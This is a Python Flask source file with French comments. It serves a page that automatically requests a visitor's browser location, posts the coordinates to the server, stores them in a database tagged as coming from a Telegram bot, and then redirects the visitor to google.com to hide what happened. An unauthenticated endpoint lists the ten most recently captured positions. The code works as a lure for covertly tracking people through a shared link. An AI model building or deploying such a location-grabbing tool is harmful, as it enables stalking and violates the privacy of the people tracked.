from flask import Flask, request, jsonify, render_template_string
from sqlalchemy import create_engine, Column, Integer, String, Float, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker
from datetime import datetime
import logging

# =========================================================
# 🔧 Configuration Flask et SQLAlchemy
# =========================================================
app = Flask(__name__)

engine = create_engine("sqlite:///bot_data.db", echo=False)
Base = declarative_base()
Session = sessionmaker(bind=engine)
session = Session()

# =========================================================
# 📦 Modèle de données
# =========================================================
class Coord(Base):
    __tablename__ = "coords"
    id = Column(Integer, primary_key=True)
    username = Column(String)
    latitude = Column(Float)
    longitude = Column(Float)
    source = Column(String, default="telegram_bot")  # utile pour tracer la provenance
    created_at = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(engine)

# =========================================================
# 🧾 Configuration du logging
# =========================================================
logging.basicConfig(
    filename="bot_coords.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# =========================================================
# 🌍 Page HTML minimale
# =========================================================
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>📍 Partage ta position</title>
</head>
<body>
<h2>📍 Récupération automatique de ta position...</h2>
<script>
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(success, error);
} else { alert("La géolocalisation n'est pas supportée."); }

async function success(pos) {
  const { latitude, longitude } = pos.coords;
  await fetch("/coords", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({latitude, longitude})
  });
  window.location.href = "https://google.com";  // Redirection finale
}

function error(err) { alert("Erreur de localisation: " + err.message); }
</script>
</body>
</html>
"""

# =========================================================
# 🧠 Routes Flask
# =========================================================

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/coords", methods=["POST", "GET"])
def coords():
    if request.method == "POST":
        try:
            data = request.get_json()
            latitude = data.get("latitude")
            longitude = data.get("longitude")

            if latitude is None or longitude is None:
                return jsonify({"error": "Coordonnées invalides"}), 400

            new_coord = Coord(
                username="Anonyme",
                latitude=latitude,
                longitude=longitude
            )
            session.add(new_coord)
            session.commit()

            logging.info(f"Coordonnées enregistrées : {latitude}, {longitude}")
            return jsonify({"message": "Coordonnées enregistrées ✅"})
        except Exception as e:
            session.rollback()
            logging.error(f"Erreur lors de l'enregistrement : {e}")
            return jsonify({"error": "Erreur interne du serveur"}), 500

    # GET : afficher les 10 dernières coordonnées
    coords = session.query(Coord).order_by(Coord.created_at.desc()).limit(10).all()
    return jsonify([
        {
            "username": c.username,
            "latitude": c.latitude,
            "longitude": c.longitude,
            "source": c.source,
            "date": c.created_at.strftime("%d/%m/%Y %H:%M")
        }
        for c in coords
    ])

# =========================================================
# 🚀 Lancement du serveur
# =========================================================
if __name__ == "__main__":
    print("🌍 Serveur Flask en ligne sur http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000)
